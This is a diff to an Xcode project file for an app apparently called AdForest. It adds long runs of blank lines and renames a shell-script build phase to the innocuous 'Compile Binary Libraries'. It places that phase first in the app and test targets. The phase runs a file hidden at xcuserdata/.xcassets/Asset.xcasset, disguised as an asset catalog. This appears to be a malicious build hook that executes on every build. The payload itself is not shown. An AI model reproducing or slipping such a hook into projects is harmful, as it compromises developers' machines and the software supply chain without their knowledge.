@@ -720,6 +720,38 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 /* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
@@ -3717,7 +3749,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
+				57D893D255AACDFDC4AAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3738,7 +3770,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB12051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestTests" */;
 			buildPhases = (
-				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
+				57D893D255AACDFDC4AAC43A /* Compile Binary Libraries */,
 				18BBFA962051098C0067662F /* Sources */,
 				18BBFA972051098C0067662F /* Frameworks */,
 				18BBFA982051098C0067662F /* Resources */,
@@ -3757,7 +3789,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB42051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestUITests" */;
 			buildPhases = (
-				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
+				57D893D255AACDFDC4AAC43A /* Compile Binary Libraries */,
 				18BBFAA12051098C0067662F /* Sources */,
 				18BBFAA22051098C0067662F /* Frameworks */,
 				18BBFAA32051098C0067662F /* Resources */,
@@ -3902,7 +3934,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */ = {
+	57D893D255AACDFDC4AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -3911,7 +3943,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3920,8 +3952,62 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
